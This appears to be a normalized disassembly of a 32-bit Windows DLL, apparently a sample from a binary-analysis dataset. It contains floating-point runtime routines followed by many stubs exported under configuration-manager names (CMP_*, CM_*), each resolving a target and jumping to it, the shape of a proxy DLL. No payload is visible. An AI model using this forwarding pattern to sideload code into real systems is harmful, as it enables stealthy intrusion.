lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1001479b
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1001479b
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1002078f
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1002081d
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_100208bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1002078f
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1002081d
push eax
mov [ ebp - 0xc ] eax
call sub_10020d9a
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10020bcc
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_10020d9a
push 0x8
push r--data
call sub_10011ecc
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_10011f11
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_10020f4c
push 0xfffffff5
call [ GetStdHandle@IAT ]
push rw-data
mov [ rw-data ] eax
call [ InitializeCriticalSection@IAT ]
push 0x800
push 0x0
push rw-data
call sub_1000b660
push r--data
push rw-data
call sub_1000b34d
push sub_10020fa2
call sub_1000b5e1
add esp 0x18
retn
CMP_GetBlockedDriverInfo
mov ecx r--data
call sub_100013c7
jmp eax
CMP_GetServerSideDeviceInstallFlags
mov ecx r--data
call sub_100013c7
jmp eax
CMP_Init_Detection
mov ecx r--data
call sub_100013c7
jmp eax
CMP_RegisterNotification
mov ecx r--data
call sub_100013c7
jmp eax
CMP_Report_LogOn
mov ecx r--data
call sub_100013c7
jmp eax
CMP_UnregisterNotification
mov ecx r--data
call sub_100013c7
jmp eax
CMP_WaitNoPendingInstallEvents
mov ecx r--data
call sub_100013c7
jmp eax
CMP_WaitServicesAvailable
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_Empty_Log_Conf
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_Empty_Log_Conf_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_IDA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_IDW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_ID_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_ID_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_Range
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_Res_Des
mov ecx r--data
call sub_100013c7
jmp eax
CM_Add_Res_Des_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Connect_MachineA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Connect_MachineW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Create_DevNodeA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Create_DevNodeW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Create_DevNode_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Create_DevNode_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Create_Range_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Delete_Class_Key
mov ecx r--data
call sub_100013c7
jmp eax
CM_Delete_Class_Key_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Delete_DevNode_Key
mov ecx r--data
call sub_100013c7
jmp eax
CM_Delete_DevNode_Key_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Delete_Range
mov ecx r--data
call sub_100013c7
jmp eax
CM_Detect_Resource_Conflict
mov ecx r--data
call sub_100013c7
jmp eax
CM_Detect_Resource_Conflict_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Disable_DevNode
mov ecx r--data
call sub_100013c7
jmp eax
CM_Disable_DevNode_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Disconnect_Machine
mov ecx r--data
call sub_100013c7
jmp eax
CM_Dup_Range_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enable_DevNode
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enable_DevNode_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enumerate_Classes
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enumerate_Classes_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enumerate_EnumeratorsA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enumerate_EnumeratorsW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enumerate_Enumerators_ExA
mov ecx r--data
call sub_100013c7
jmp eax
CM_Enumerate_Enumerators_ExW
mov ecx r--data
call sub_100013c7
jmp eax
CM_Find_Range
mov ecx r--data
call sub_100013c7
jmp eax
CM_First_Range
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Log_Conf
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Log_Conf_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Log_Conf_Handle
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Range_List
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Res_Des
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Res_Des_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Res_Des_Handle
mov ecx r--data
call sub_100013c7
jmp eax
CM_Free_Resource_Conflict_Handle
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Child
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Child_Ex
mov ecx r--data
call sub_100013c7
jmp eax
CM_Get_Class_Key_NameA
mov ecx r--data
call sub_100013c7
jmp eax
